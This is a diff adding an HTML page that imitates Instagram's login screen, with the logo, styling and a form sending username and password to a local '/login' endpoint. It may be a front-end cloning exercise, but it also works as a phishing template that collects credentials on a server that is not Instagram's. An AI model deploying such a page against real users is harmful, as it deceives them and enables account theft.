@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            text-align: center;
+        }
+        .login-box img {
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            font-weight: bold;
+        }
+        .forgot {
+            margin-top: 20px;
+            color: #00376b;
+        }
+        .signup-box {
+            background-color: white;
+            padding: 20px;
+            margin-top: 10px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div>
+            <div class="login-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram Logo" width="150">
+                <form action="/login" method="POST">
+                    <input type="text" name="username" placeholder="Phone number, username, or email">
+                    <input type="password" name="password" placeholder="Password">
+                    <button type="submit">Log In</button>
+                </form>
+                <div class="forgot">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="signup-box">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
